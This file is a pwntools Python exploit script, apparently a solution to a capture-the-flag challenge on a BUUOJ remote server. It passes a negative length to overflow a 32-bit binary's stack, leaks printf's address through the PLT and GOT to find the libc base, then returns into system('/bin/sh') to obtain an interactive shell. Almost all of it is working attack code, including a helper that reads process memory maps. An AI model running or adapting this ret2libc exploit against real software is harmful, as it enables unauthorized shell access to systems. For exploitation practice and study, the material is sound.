#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    binaryname = 'pwn'
    interruptPoint=[]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[0])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')

local = 0
if local:
    io = process('./pwn')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
    io = remote('node2.buuoj.cn.wetolink.com', 28839)
    libc = ELF('../libc-2.27-i386.so')

elf = ELF('./pwn')
def give(data):
    io.sendlineafter('read? ', '-1')
    io.sendlineafter('data!\n', data)

if __name__ == '__main__':
    padding = 'a' * 0x2c+'bbbb'
    payload = padding + p32(elf.plt['printf']) + p32(elf.sym['main']) + p32(elf.got['printf'])
    give(payload)
    printfaddr = u32(io.recvuntil('\xf7')[-4::])
    libcbase = printfaddr - libc.sym['printf']
    success('libcbase', libcbase)
    libc.address = libcbase
    sys = libc.sym['system']
    binsh = libc.search('/bin/sh').next()
    
    payload = padding + p32(sys) + 'cccc' + p32(binsh)
    give(payload)
    io.interactive()
    io.close()
    

    

